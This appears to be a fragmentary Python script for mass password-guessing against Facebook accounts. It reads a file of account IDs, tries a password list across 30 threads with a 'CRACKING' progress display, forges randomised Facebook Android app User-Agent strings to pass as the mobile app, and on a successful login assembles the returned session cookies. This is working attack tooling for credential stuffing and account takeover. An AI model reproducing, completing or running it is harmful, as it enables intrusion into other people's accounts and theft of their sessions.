...
def logo():
    rprint("""[bold green]
              ...
              ╚══════╝╚═╝  ╚═╝ ╚════╝ ╚═╝  ╚═╝
{}
                     [bold green]CREATED BY [bold yellow]GEO
{}[/]""".format(r,g,b,y,r,g,b,y,r,g,b,y,r,g,b,y,r,g,b,y,r,g,b,y,"[bold green]="*os.get_terminal_size().columns,"[bold green]="*os.get_terminal_size().columns))
def lines():
    rprint("[bold green]="*os.get_terminal_size().columns)
async def login():
...
def main():
    try:
        ...
        lines()
        xx=input(" \033[1;32mChoose Number: \033[1;37m")
        if xx == "1":
            clear()
            logo()
            fi=input("\033[1;32m Enter Your File: \033[1;37m")
            try:
            ...
            with tred(max_workers=30) as exca_sub:
                clear()
                logo()
                print(f" \033[1;32mTotal IDS:\033[1;33m {len(fi2)}\n \033[1;32mPasswords:\033[1;32m {len(passw)}")
                lines()
...
def m2(ids,names,passlist):
    ...
    try:
        ...
        try:
            ...
            ln=fn
        for pw in passlist:
            sys.stdout.write("\r\r\033[1;32m CRACKING\033[1;35m(\033[1;37m%s\033[1;35m) \033[1;32mOK•%s \033[1;31mCP•%s"%(loop,len(oks),len(cps)));sys.stdout.flush()
            ...
            headers={
                    'User-Agent': f"[FBAN/FB4A;FBAV/{random.randint(100,300)}.0.0.{random.randint(10,20)}.{random.randint(80,150)};FBBV/{random.randint(20000000,80000000)};[FBAN/{fbpnnn};FBAV/{random.randint(100,300)}.0.0.{random.randint(10,20)}.{random.randint(80,150)}"+";FBBV/2"+str(random.randint(1000000,9999999))+";FBDM/{density=3.0,width=1080,height=1920};FBLC/en_US;FBRV/454649588;FBCR/TM;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.%s;FBDV/SM-T819C;FBSV/7.0;FBCA/armeabi-v7a:armeabi;]"%(fbpnn)+f" [FBAN/FB4A;FBAV/{random.randint(100,300)}.0.0.{random.randint(10,20)}.{random.randint(80,150)};FBBV/{random.randint(20000000,99999999)};[FBAN/{fbpnnn};FBAV/{random.randint(100,300)}.0.0.{random.randint(10,20)}.{random.randint(80,150)}"+";FBBV/2"+str(random.randint(1000000,9999999))+";FBDM/{density=3.0,width=1080,height=1920};FBLC/en_US;FBRV/0;FBCR/GLOBE;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.%s;FBDV/SM-A315G;FBSV/6.0.1;FBCA/armeabi-v7a:armeabi;]"%(fbpnn)+f" [FBAN/FB4A;FBAV/{random.randint(100,300)}.0.0.{random.randint(10,20)}.{random.randint(80,150)};FBBV/{random.randint(20000000,99999999)};[FBAN/{fbpnnn};FBAV/{random.randint(100,300)}.0.0.{random.randint(10,20)}.{random.randint(80,150)}"+";FBBV/2"+str(random.randint(10000000,99999999))+";FBDM/{density=3.0,width=1080,height=1920};FBLC/en_US;FBCR/TM;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.%s;FBDV/SM-T580X;FBSV/5.0;FBCA/armeabi-v7a:armeabi;]"%(fbpnn),
             'Content-Type': 'application/x-www-form-urlencoded', 
            ...
            if 'session_key' in req:
                coki = "sb=%s"%(''.join(random.choices(string.digits+string.ascii_letters+"_",k=30))+";"+';'.join(x['name']+"="+x['value'] for x in response['session_cookies']))
